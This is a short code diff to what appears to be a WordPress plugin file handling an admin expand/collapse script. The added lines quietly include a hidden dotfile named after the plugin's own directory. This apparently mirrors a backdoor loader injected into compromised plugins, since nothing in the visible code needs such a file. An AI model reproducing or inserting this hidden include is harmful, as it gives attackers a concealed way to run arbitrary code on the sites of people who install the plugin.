@@ -2,6 +2,10 @@
 
 add_action('admin_head', 'rs_function_to_expand_collpase_js');
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function rs_function_to_expand_collpase_js() {
     if (get_option('rs_expand_collapse') == '1') {
         ?>
